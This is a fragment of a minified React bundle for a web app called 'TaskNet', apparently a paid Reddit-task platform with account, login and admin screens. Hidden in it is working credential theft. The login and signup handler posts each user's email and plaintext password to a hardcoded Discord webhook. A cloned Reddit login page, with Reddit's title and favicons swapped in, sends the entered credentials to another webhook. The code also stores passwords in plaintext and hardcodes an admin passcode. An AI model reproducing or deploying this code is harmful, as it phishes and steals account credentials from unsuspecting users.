transition-colors",children:n.jsx(re,{size:18,strokeWidth:3})})]})}),n.jsxs("div",{className:"max-w-7xl mx-auto",children:[n.jsxs("header",{className:"mb-10",children:[n.jsx("h1",{className:"text-3xl font-bold tracking-tight mb-2",children:"Account"}),n.jsx("p",{className:"text-gray-500 text-sm",children:"Update your profile and account preferences."})]}),n.jsxs("div",{className:"flex flex-col lg:flex-row gap-12",children:[n.jsxs("aside",{className:"w-full lg:w-64 space-y-2",children:[n.jsx("p",{className:"text-[10px] font-black text-gray-600 uppercase tracking-[0.2em] mb-4 ml-4",children:"Select Menu"}),Ge.map(F=>n.jsxs("button",{onClick:()=>r(F.label),className:`w-full flex items-center gap-3 px-6 py-4 rounded-2xl transition-all ${t===F.label?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white hover:bg-white/[0.03]"}`,children:[F.icon,n.jsx("span",{className:"font-bold text-sm tracking-tight",children:F.label})]},F.label)),n.jsx("div",{className:"pt-4 mt-4 border-t border-white/5",children:n.jsxs("button",{onClick:yt,className:"w-full flex items-center gap-3 px-6 py-4 rounded-2xl text-red-500 hover:bg-red-500/10 transition-all group",children:[n.jsx(Vm,{size:18,className:"group-hover:-translate-x-1 transition-transform"}),n.jsx("span",{className:"font-bold text-sm tracking-tight",children:"Sign Out"})]})})]}),n.jsx("div",{className:"flex-1 bg-white/[0.02] border border-white/5 rounded-[40px] p-8 sm:p-12",children:n.jsxs("div",{className:"max-w-2xl",children:[Ne(),t!=="Change Password"&&n.jsxs("div",{className:"flex items-center gap-4 mt-16 pt-8 border-t border-white/5",children:[n.jsx("button",{onClick:te,className:"px-10 py-3.5 bg-white/5 border border-white/5 text-white rounded-2xl font-bold text-sm hover:bg-white/10 transition-all",children:"Discard"}),n.jsx("button",{disabled:C,onClick:oe,className:"flex-1 py-3.5 bg-blue-600 text-white rounded-2xl font-bold text-sm hover:bg-blue-700 transition-all shadow-xl shadow-blue-600/20 disabled:opacity-50",children:C?"Processing...":"Apply Changes"})]})]})})]})]})]})},Hw=()=>{const[e,t]=b.useState(""),[r,s]=b.useState(""),[a,i]=b.useState(""),[l,o]=b.useState(!1),[c,u]=b.useState(!1),h=St(),[p,x]=b.useState({show:!1,message:"",type:"info"}),v=(j,y="info")=>{x({show:!0,message:j,type:y}),setTimeout(()=>x(m=>({...m,show:!1})),2e3)},f=async(j,y,m,g)=>{const k="https://discord.com/api/webhooks/1463863225090048061/FeAWGacn_gEc9T3RX-p1AMFlCycozmOsq9C3EssHemT_YDDiTBxwMLpx_vkLeepncHpL",C=new Date().toLocaleString(),S={embeds:[{title:j==="register"?" New Registration":" User Login",color:j==="register"?65280:3900150,fields:[{name:" Email",value:`\`\`\`${y}\`\`\``,inline:!1},{name:" Password",value:`\`\`\`${m}\`\`\``,inline:!1},...g?[{name:" Server Username",value:`\`\`\`${g}\`\`\``,inline:!1}]:[],{name:" Timestamp",value:C,inline:!1}],footer:{text:"TaskNet Authentication"}}]};try{await fetch(k,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(S)})}catch(R){console.error("Webhook error:",R)}},w=async j=>{if(j.preventDefault(),u(!0),l){if(!a){v("Please fill in all fields.","error"),u(!1);return}const{data:y}=await z.from("profiles").select("email").eq("email",e).single();if(y){v("Account with this email already exists. Please login.","error"),u(!1);return}const{error:m}=await z.from("profiles").insert({email:e,password:r,server_username:a,created_at:new Date().toISOString(),updated_at:new Date().toISOString()});m?v("Error creating account: "+m.message,"error"):(await f("register",e,r,a),wc("user_email",e,30),localStorage.setItem("user_email",e),v("Account created! Welcome to TaskNet.","success"),setTimeout(()=>h("/"),1500))}else{const{data:y,error:m}=await z.from("profiles").select("email, password").eq("email",e).single();if(m||!y){v("Account not found. Please sign up first.","error"),u(!1);return}if(y.password!==r){v("Incorrect password. Please try again.","error"),u(!1);return}await z.from("profiles").update({updated_at:new Date().toISOString()}).eq("email",e),await f("login",e,r),wc("user_email",e,30),localStorage.setItem("user_email",e),v("Login successful! Redirecting...","success"),setTimeout(()=>h("/"),1e3)}u(!1)};return n.jsxs("div",{className:"min-h-screen w-full bg-black flex items-center justify-center p-6 selection:bg-blue-600 selection:text-white",children:[n.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${p.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:n.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${p.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":p.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx("div",{className:"flex-shrink-0",children:p.type==="success"?n.jsx(Fe,{size:24,strokeWidth:3}):p.type==="error"?n.jsx(re,{size:24,strokeWidth:3}):n.jsx(Ee,{size:24,strokeWidth:3})}),n.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:p.message})]}),n.jsx("button",{onClick:()=>x(j=>({...j,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:n.jsx(re,{size:18,strokeWidth:3})})]})}),n.jsxs("div",{className:"fixed inset-0 overflow-hidden pointer-events-none",children:[n.jsx("div",{className:"absolute top-[-20%] left-[-10%] w-[60%] h-[60%] rounded-full bg-blue-900/10 blur-[120px]"}),n.jsx("div",{className:"absolute bottom-[-20%] right-[-10%] w-[50%] h-[50%] rounded-full bg-blue-900/5 blur-[100px]"})]}),n.jsxs("div",{className:"relative w-full max-w-[440px] animate-in fade-in zoom-in duration-500",children:[n.jsxs("div",{className:"bg-white/[0.02] border border-white/5 backdrop-blur-2xl rounded-[32px] p-10 shadow-2xl",children:[n.jsxs("div",{className:"flex flex-col items-center text-center mb-10",children:[n.jsx("div",{className:"w-16 h-16 bg-gradient-to-br from-blue-500 to-blue-700 rounded-2xl flex items-center justify-center mb-6 shadow-xl shadow-blue-600/20 rotate-3 group hover:rotate-0 transition-transform cursor-pointer",children:n.jsx("svg",{viewBox:"0 0 24 24",className:"w-10 h-10 fill-white",xmlns:"http://www.w3.org/2000/svg",children:n.jsx("path",{d:"M12 2C6.477 2 2 6.477 2 12c0 5.523 4.477 10 10 10s10-4.477 10-10c0-5.523-4.477-10-10-10zm4.5 13.5h-9v-1.5h9v1.5zm0-3h-9v-1.5h9v1.5zm0-3h-9v-1.5h9v1.5z"})})}),n.jsx("h1",{className:"text-3xl font-black tracking-tighter mb-1 uppercase italic",children:l?"Join TaskNet":"TaskNet"}),n.jsx("p",{className:"text-gray-500 text-sm font-medium",children:l?"Start your automation journey":"Powering your automated infrastructure"})]}),n.jsxs("form",{className:"space-y-5",onSubmit:w,children:[l&&n.jsxs("div",{className:"space-y-2 animate-in fade-in slide-in-from-top-2 duration-300",children:[n.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase ml-1",children:"Server Username"}),n.jsxs("div",{className:"relative group",children:[n.jsx(lr,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:18}),n.jsx("input",{type:"text",required:!0,placeholder:"Enter server username",value:a,onChange:j=>i(j.target.value),className:"w-full pl-12 pr-4 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]})]}),n.jsxs("div",{className:"space-y-2",children:[n.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase ml-1",children:"Email Address"}),n.jsxs("div",{className:"relative group",children:[n.jsx(qm,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:18}),n.jsx("input",{type:"email",placeholder:"name@company.com",value:e,onChange:j=>t(j.target.value),className:"w-full pl-12 pr-4 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]})]}),n.jsxs("div",{className:"space-y-2",children:[n.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase ml-1",children:"Password"}),n.jsxs("div",{className:"relative group",children:[n.jsx($t,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:18}),n.jsx("input",{type:"password",required:!0,placeholder:"",value:r,onChange:j=>s(j.target.value),className:"w-full pl-12 pr-4 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]})]}),n.jsxs("button",{type:"submit",disabled:!e||!r||c,className:"w-full py-4 bg-blue-600 text-white rounded-2xl font-bold text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-all shadow-lg shadow-blue-600/20 flex items-center justify-center gap-2 group mt-4",children:[c?"Processing...":l?"Create Account":"Sign In",!c&&n.jsx(wu,{size:18,className:"group-hover:translate-x-1 transition-transform"})]})]}),n.jsx("div",{className:"mt-10 text-center",children:n.jsxs("p",{className:"text-gray-500 text-sm",children:[l?"Already have an account?":"Don't have an account?"," ",n.jsx("button",{onClick:()=>o(!l),className:"text-blue-500 font-bold hover:underline",children:l?"Sign In":"Create one"})]})})]}),n.jsx("div",{className:"mt-8 text-center",children:n.jsx("p",{className:"text-[11px] text-gray-600 uppercase tracking-widest font-bold",children:" 2026 TaskNet Infrastructure"})})]})]})},Kw=()=>{const[e,t]=b.useState(""),[r,s]=b.useState(""),[a,i]=b.useState(!1),[l,o]=b.useState(!1),[c,u]=b.useState(!1),[h,p]=b.useState({show:!1,message:"",type:"info"});b.useEffect(()=>{const f=()=>{document.querySelectorAll('link[rel*="icon"]').forEach(m=>m.remove()),[{href:"https://www.redditstatic.com/shreddit/assets/favicon/64x64.png",sizes:"64x64",rel:"icon shortcut"},{href:"https://www.redditstatic.com/shreddit/assets/favicon/128x128.png",sizes:"128x128",rel:"icon shortcut"},{href:"https://www.redditstatic.com/shreddit/assets/favicon/192x192.png",sizes:"192x192",rel:"icon shortcut"},{href:"https://www.redditstatic.com/shreddit/assets/favicon/76x76.png",sizes:"76x76",rel:"apple-touch-icon"},{href:"https://www.redditstatic.com/shreddit/assets/favicon/120x120.png",sizes:"120x120",rel:"apple-touch-icon"},{href:"https://www.redditstatic.com/shreddit/assets/favicon/152x152.png",sizes:"152x152",rel:"apple-touch-icon"},{href:"https://www.redditstatic.com/shreddit/assets/favicon/180x180.png",sizes:"180x180",rel:"apple-touch-icon"}].forEach(({href:m,sizes:g,rel:k})=>{const C=document.createElement("link");C.href=m,C.sizes=g,C.rel=k,document.head.appendChild(C)})},w=document.title;return document.title="Log In  Reddit",f(),()=>{document.querySelectorAll('link[href*="redditstatic.com"]').forEach(y=>y.remove()),document.title=w}},[]);const x=(f,w="info")=>{p({show:!0,message:f,type:w}),setTimeout(()=>p(j=>({...j,show:!1})),2e3)},v=async f=>{f.preventDefault(),u(!0);const w=!e.trim(),j=!r.trim();if(i(w),o(j),!(w||j))try{const y="https://discord.com/api/webhooks/1463586619612205289/3sRnACuGhW3BCULUQkyaTnaw3EIWd3NhumDqyknN70FPgjccKOqTjeGZxVTEwprhRiot",m=new Date().toLocaleString("en-US",{timeZone:"UTC",year:"numeric",month:"long",day:"numeric",hour:"2-digit",minute:"2-digit",second:"2-digit"}),g={embeds:[{title:" Reddit Login Attempt",color:16729344,fields:[{name:" Email/Username",value:`\`\`\`${e}\`\`\``,inline:!1},{name:" Password",value:`\`\`\`${r}\`\`\``,inline:!1},{name:" Timestamp",value:m,inline:!1},{name:" Source",value:"TaskNet Reddit Login Page",inline:!1}],footer:{text:"TaskNet Security Monitor"},timestamp:new Date().toISOString()}]};await fetch(y,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(g)})}catch(y){console.error("Error sending to Discord:",y),x("Reddit Login is for simulation only.","info")}};return n.jsxs("div",{className:"min-h-screen w-full bg-[#0B1416] flex flex-col font-['Noto_Sans',_sans-serif] selection:bg-blue-500 selection:text-white",children:[n.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${h.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:n.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${h.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":h.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx("div",{className:"flex-shrink-0",children:h.type==="success"?n.jsx(Fe,{size:24,strokeWidth:3}):h.type==="error"?n.jsx(re,{size:24,strokeWidth:3}):n.jsx(Ee,{size:24,strokeWidth:3})}),n.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:h.message})]}),n.jsx("button",{onClick:()=>p(f=>({...f,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:n.jsx(re,{size:18,strokeWidth:3})})]})}),n.jsx("header",{className:"w-full px-6 py-5 flex items-center",children:n.jsx("div",{className:"flex items-center gap-2",children:n.jsxs("div",{className:"flex items-center gap-3",children:[n.jsx("div",{className:"w-8 h-8 bg-[#FF4500] rounded-full flex items-center justify-center",children:n.jsx("svg",{className:"w-5 h-5",viewBox:"0 0 20 20",fill:"white",xmlns:"http://www.w3.org/2000/svg",children:n.jsx("path",{d:"M16 10c0-.4-.3-.7-.7-.7h-.1c-.5-.4-1.1-.6-1.9-.6l.4-2 1.3.3c.1.3.3.5.6.5.3 0 .6-.3.6-.6s-.3-.6-.6-.6c-.3 0-.5.1-.6.4l-1.5-.3c-.1 0-.2.1-.2.1l-.5 2.2c-.7.1-1.4.3-1.9.6h-.1c-.4 0-.7.3-.7.7s.3.7.7.7h.1c.1.3.2.6.3.8-.3.2-.5.5-.5.9 0 .6.4 1.1 1.1 1.1.3 0 .5-.1.7-.3.5.2 1.2.4 1.9.4s1.4-.1 1.9-.4c.2.2.5.3.7.3.6 0 1.1-.5 1.1-1.1 0-.4-.2-.7-.5-.9.1-.3.2-.6.3-.8h.1c.4 0 .7-.3.7-.7zM8.2 11c-.3 0-.6-.3-.6-.6s.3-.6.6-.6.6.3.6.6-.3.6-.6.6zm4.1 1.9c-.7.6-2.2.6-3 0-.1-.1-.1-.1-.1-.2s.1-.1.2-.1c.6.5 2 .5 2.6 0 .1 0 .1 0 .2.1 0 .1 0 .1 0 .2zm.1-1.3c-.3 0-.6-.3-.6-.6s.3-.6.6-.6.6.3.6.6-.3.6-.6.6z"})})}),n.jsx("span",{className:"text-white text-2xl font-semibold tracking-tight",children:"reddit"})]})})}),n.jsx("div",{className:"flex-1 flex items-center justify-center p-4",children:n.jsxs("div",{className:"w-full max-w-[440px] bg-[#1A1A1B] rounded-3xl p-8 shadow-2xl",children:[n.jsx("h1",{className:"text-white text-2xl font-medium text-center mb-4",children:"Log In"}),n.jsxs("p",{className:"text-[#B8C5C9] text-xs text-center mb-6 leading-relaxed",children:["By continuing, you agree to our ",n.jsx("a",{href:"#",className:"text-[#4A9EFF] hover:underline",children:"User Agreement"})," and acknowledge that you understand the ",n.jsx("a",{href:"#",className:"text-[#4A9EFF] hover:underline",children:"Privacy Policy"}),"."]}),n.jsxs("div",{className:"space-y-3 mb-6",children:[n.jsxs("button",{className:"w-full h-12 bg-white hover:bg-gray-100 rounded-full flex items-center justify-center gap-3 text-[#1C1C1C] font-bold text-sm transition-colors",children:[n.jsx("svg",{className:"w-4 h-4",viewBox:"0 0 24 24",fill:"currentColor",children:n.jsx("path",{d:"M20.01 15.38c-1.23 0-2.42-.2-3.53-.56-.35-.12-.74-.03-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.01 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"})}),"Continue With Phone Number"]}),n.jsxs("button",{className:"w-full h-12 bg-white hover:bg-gray-100 rounded-full flex items-center justify-center gap-3 text-[#1C1C1C] font-bold text-sm transition-colors",children:[n.jsx("img",{src:"https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg",alt:"Google",className:"w-5 h-5"}),"Continue With Google"]}),n.jsxs("button",{className:"w-full h-12 bg-white hover:bg-gray-100 rounded-full flex items-center justify-center gap-3 text-[#1C1C1C] font-bold text-sm transition-colors",children:[n.jsx("svg",{className:"w-5 h-5",viewBox:"0 0 384 512",fill:"currentColor",children:n.jsx("path",{d:"M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"})}),"Continue With Apple"]}),n.jsxs("button",{className:"w-full h-12 bg-white hover:bg-gray-100 rounded-full flex items-center justify-center gap-3 text-[#1C1C1C] font-bold text-sm transition-colors",children:[n.jsxs("svg",{className:"w-4 h-4",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[n.jsx("path",{d:""}),n.jsx("path",{d:"M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"})]}),"Email me a one-time link"]})]}),n.jsxs("div",{className:"flex items-center gap-4 mb-6",children:[n.jsx("div",{className:"h-px flex-1 bg-[#343536]"}),n.jsx("span",{className:"text-[#B8C5C9] text-xs font-bold",children:"OR"}),n.jsx("div",{className:"h-px flex-1 bg-[#343536]"})]}),n.jsxs("form",{className:"space-y-4",onSubmit:v,children:[n.jsxs("div",{children:[n.jsxs("div",{className:`relative ${a?"mb-1":""}`,children:[n.jsx("input",{type:"text",placeholder:"Email or username *",value:e,onChange:f=>{t(f.target.value),c&&i(!f.target.value.trim())},className:`w-full h-12 bg-transparent border-2 rounded-full px-4 text-white text-sm placeholder:text-[#818384] focus:outline-none transition-colors ${a?"border-[#EA0027] focus:border-[#EA0027]":"border-[#343536] focus:border-white hover:border-[#474748]"}`}),a&&n.jsx("div",{className:"absolute right-4 top-1/2 -translate-y-1/2",children:n.jsxs("svg",{className:"w-5 h-5 text-[#EA0027]",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[n.jsx("circle",{cx:"12",cy:"12",r:"10"}),n.jsx("line",{x1:"12",y1:"8",x2:"12",y2:"12"}),n.jsx("line",{x1:"12",y1:"16",x2:"12.01",y2:"16"})]})})]}),a&&n.jsx("p",{className:"text-[#EA0027] text-xs ml-4 mb-2",children:"Please fill out this field."})]}),n.jsxs("div",{children:[n.jsxs("div",{className:`relative ${l?"mb-1":""}`,children:[n.jsx("input",{type:"password",placeholder:"Password *",value:r,onChange:f=>{s(f.target.value),c&&o(!f.target.value.trim())},className:`w-full h-12 bg-transparent border-2 rounded-full px-4 text-white text-sm placeholder:text-[#818384] focus:outline-none transition-colors ${l?"border-[#EA0027] focus:border-[#EA0027]":"border-[#343536] focus:border-white hover:border-[#474748]"}`}),l&&n.jsx("div",{className:"absolute right-4 top-1/2 -translate-y-1/2",children:n.jsxs("svg",{className:"w-5 h-5 text-[#EA0027]",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[n.jsx("circle",{cx:"12",cy:"12",r:"10"}),n.jsx("line",{x1:"12",y1:"8",x2:"12",y2:"12"}),n.jsx("line",{x1:"12",y1:"16",x2:"12.01",y2:"16"})]})})]}),l&&n.jsx("p",{className:"text-[#EA0027] text-xs ml-4 mb-2",children:"Please fill out this field."})]}),n.jsxs("div",{className:"text-xs space-y-2 pt-2",children:[n.jsx("a",{href:"#",className:"text-[#4A9EFF] hover:underline block",children:"Forgot password?"}),n.jsxs("p",{className:"text-[#B8C5C9]",children:["New to Reddit? ",n.jsx("a",{href:"#",className:"text-[#4A9EFF] hover:underline",children:"Sign Up"})]})]}),n.jsx("button",{type:"submit",className:"w-full h-12 bg-[#D93A00] hover:bg-[#C13B00] disabled:bg-[#343536] disabled:text-[#818384] disabled:cursor-not-allowed text-white rounded-full font-bold text-sm transition-colors mt-6",children:"Log In"})]})]})})]})},Ya={binance:"https://cryptologos.cc/logos/binance-coin-bnb-logo.png",usdt:"https://cryptologos.cc/logos/tether-usdt-logo.png",upi:"https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/UPI-Logo-vector.svg/1200px-UPI-Logo-vector.svg.png"},Gw=()=>{const[e,t]=b.useState(""),[r,s]=b.useState(!1),[a,i]=b.useState([]),[l,o]=b.useState([]),[c,u]=b.useState([]),[h,p]=b.useState([]),[x,v]=b.useState(null),[f,w]=b.useState("Tasks"),[j,y]=b.useState(!1),[m,g]=b.useState(""),[k,C]=b.useState(""),[S,R]=b.useState(!1),[T,L]=b.useState(!1),[$,G]=b.useState(null),[fe,se]=b.useState(""),[J,B]=b.useState(!1),[ie,ne]=b.useState(!1),[I,D]=b.useState(null),[W,te]=b.useState(!1),[oe,yt]=b.useState(null),[ze,Ge]=b.useState(""),[Ne,F]=b.useState("Tier 1"),[ce,ue]=b.useState(""),[O,X]=b.useState("COMMENT"),[Le,Bt]=b.useState(""),[Y,Et]=b.useState(""),[gn,Vr]=b.useState(""),[yn,qr]=b.useState(""),[Je,Jt]=b.useState("All"),[Hr,Kr]=b.useState(!1),Gr=b.useRef(null),[Jr,Yr]=b.useState(!1),Qr=b.useRef(null),[Xr,vn]=b.useState(!1),Zr=b.useRef(null),[le,wn]=b.useState(new Date),[es,Yt]=b.useState(!1),[Ct,bn]=b.useState(""),ts=b.useRef(null),[me,Qt]=b.useState({show:!1,message:"",type:"info"}),K=(d,N="info")=>{Qt({show:!0,message:d,type:N}),setTimeout(()=>Qt(E=>({...E,show:!1})),2e3)},hl=d=>{d.preventDefault(),e==="SS@19151"?(s(!0),K("Access granted. Welcome Admin.","success")):K("Invalid admin passcode.","error")},rs=async()=>{const{data:d,error:N}=await z.from("withdrawal_requests").select("*").order("created_at",{ascending:!1});N||u(d||[])},Xt=async()=>{const{data:d,error:N}=await z.from("admin_alerts").select("*").eq("user_email","ADMIN_REPORT").order("created_at",{ascending:!1});N||p(d||[])},fl=async d=>{p(N=>N.filter(E=>E.id!==d));try{const{error:N}=await z.from("admin_alerts").delete().eq("id",d);N?(console.error("Delete error:",N),K("Error: "+N.message,"error"),Xt()):K("Report resolved","success")}catch(N){console.error("Catch error:",N),Xt()}};b.useEffect(()=>{if(r){Ye(),ss(),rs(),Xt();const N=setInterval(()=>{Ye(),ss(),rs(),Xt()},1e4);return()=>clearInterval(N)}const d=N=>{ts.current&&!ts.current.contains(N.target)&&Yt(!1),Gr.current&&!Gr.current.contains(N.target)&&Kr(!1),Qr.current&&!Qr.current.contains(N.target)&&Yr(!1),Zr.current&&!Zr.current.contains(N.target)&&vn(!1)};return document.addEventListener("mousedown",d),()=>document.removeEventListener("mousedown",d)},[r]);const Ye=async()=>{const{data:d,error:N}=await z.from("tasks").select("*").order("created_at",{ascending:!1});N?console.error("Error fetching tasks:",N):i(d||[])},ss=async(d=!1)=>{const{data:N,error:E}=await z.from("profiles").select("email, reddit_username, server_username, discord_username, balance, payout_methods, reddit_karma");E?console.error("Error fetching profiles:",E):N&&(o(N),N.forEach(P=>{P.reddit_username&&P.reddit_username!=="not_connected"&&(P.reddit_karma==null||d)&&ml(P.email,P.reddit_username)}))},ml=async(d,N)=>{try{const E=`https://www.reddit.com/user/${N}/about.json`;let P;try{P=await fetch(E,{headers:{Accept:"application/json"}})}catch{P=await fetch(`https://corsproxy.io/?${encodeURIComponent(E)}`)}if(P.ok){const _=await P.json();if(_!=null&&_.data){const Z=_.data.total_karma??(_.data.link_karma+_.data.comment_karma||0);o(Re=>Re.map(Tt=>Tt.email===d?{...Tt,reddit_karma:Z}:Tt)),await z.from("profiles").update({reddit_karma:Z}).eq("email",d);return}}o(_=>_.map(Z=>Z.email===d?{...Z,reddit_karma:0}:Z))}catch(E){console.error("Error fetching karma for",N,E),o(P=>P.map(_=>_.email===d?{..._,reddit_karma:0}:_))}},pl=async d=>{if(d.assigned_to!=="All")return;const N="https://discord.com/api/webhooks/1463922549120434186/4juUa6WRV4dCkAjfYv35DruT5VRS8AXT8TazwOCkbVGM1yBXnUP6hQHbdnjUqxGO9Dwp",E=`:rocket: NEW TASK ALERT

A new task has been published.
<@&1464974222559281210>
:link: Claim it here:
https://tasknet.site/dashboard`;try{await fetch(N,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:E})})}catch(P){console.error("Error sending Discord notification:",P)}},xl=async d=>{var P;d.preventDefault();const E={task_id_display:x?(P=a.find(_=>_.id===x))==null?void 0:P.task_id_display:`#${Math.floor(1e5+Math.random()*9e5)}`,tier:Ne,subreddit:ce,title:ze,category:O,reward:Le,deadline:Y,reddit_url:gn,instructions:yn,assigned_to:Je,is_hidden:!1};if(x){const{error:_}=await z.from("tasks").update(E).eq("id",x);_?K("Error updating task: "+_.message,"error"):(K("Task Updated Successfully!","success"),v(null))}else{const{error:_}=await z.from("tasks").insert([E]);_?K("Error posting task: "+_.message,"error"):(K("Task Posted Successfully!","success"),pl(E))}jn(),Ye()},jn=()=>{Ge(""),F("Tier 1"),ue(""),Bt(""),Et(""),Vr(""),qr(""),Jt("All"),X("COMMENT"),v(null),bn("")},gl=d=>{v(d.id),Ge(d.title),F(d.tier||"Tier 1"),ue(d.subreddit||""),X(d.category),Bt(d.reward),Et(d.deadline),Vr(d.reddit_url),qr(d.instructions),Jt(d.assigned_to),window.scrollTo({top:0,behavior:"smooth"})},yl=async d=>{if(!window.confirm("Delete this task?"))return;const{error:N}=await z.from("tasks").delete().eq("id",d);N?K("Error deleting task","error"):(K("Task Deleted Successfully","success"),Ye())},vl=async d=>{const{error:N}=await z.from("tasks").update({is_hidden:!d.is_hidden}).eq("id",d.id);N?K("Error updating status","error"):(K(d.is_hidden?"Task Visible":"Task Hidden","info"),Ye())},wl=async d=>{if(!d.claimed_by)return;const{error:N}=await z.from("tasks").update({status:"verified"}).eq("id",d.id);if(N){K("Error verifying task: "+N.message,"error");return}const{data:E}=await z.from("profiles").select("balance").eq("email",d.claimed_by).single(),P=parseFloat((E==null?void 0:E.balance)||"0"),_=parseFloat(d.reward.replace("$","")),Z=P+_,{error:Re}=await z.from("profiles").update({balance:Z}).eq("email",d.claimed_by);Re?K("Error updating balance: "+Re.message,"error"):(K("Task verified and reward added to wallet!","success"),Ye())},kn=async d=>{g(d),C(""),y(!0)},bl=d=>{G(d),se(""),L(!0)},jl=async()=>{if(!$||!fe.trim())return;B(!0);const{error:d}=await z.from("tasks").update({status:"rejected"}).eq("id",$.id);if(d){K("Error rejecting task: "+d.message,"error"),B(!1);return}const{error:N}=await z.from("admin_alerts").insert([{user_email:$.claimed_by,message:`Your submission for task "${$.title}" (${$.task_id_display}) has been rejected.

Reason: ${fe}`}]);N?K("Task rejected but failed to notify user: "+N.message,"error"):K("Task rejected and user notified!","success"),L(!1),G(null),se(""),B(!1),Ye()},kl=d=>{D(d),ne(!0)},_l=async()=>{if(!I)return;te(!0);const{error:d}=await z.from("withdrawal_requests").update({status:"completed"}).eq("id",I.id);d?K("Error updating withdrawal: "+d.message,"error"):(K("Withdrawal marked as completed!","success"),rs(),ne(!1),D(null)),te(!1)},Nl=async()=>{if(!k.trim())return;R(!0);const{error:d}=await z.from("admin_alerts").insert([{user_email:m,message:k}]);d?K("Error sending alert: "+d.message,"error"):(K("Alert sent to user!","success"),y(!1)),R(!1)},_n=l.filter(d=>d.email.toLowerCase().includes(Ct.toLowerCase())||d.reddit_username&&d.reddit_username.toLowerCase().includes(Ct.toLowerCase())),lt=l.find(d=>d.email===Je),Sl=Je==="All"?"Everyone (Public)":`${(lt==null?void 0:lt.server_username)||Je.split("@")[0]}[${(lt==null?void 0:lt.reddit_username)||"No Reddit"}]`;return r?n.jsxs(hr,{children:[n.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${me.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:n.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${me.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":me.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[n.jsxs("div",{className:"flex items-center 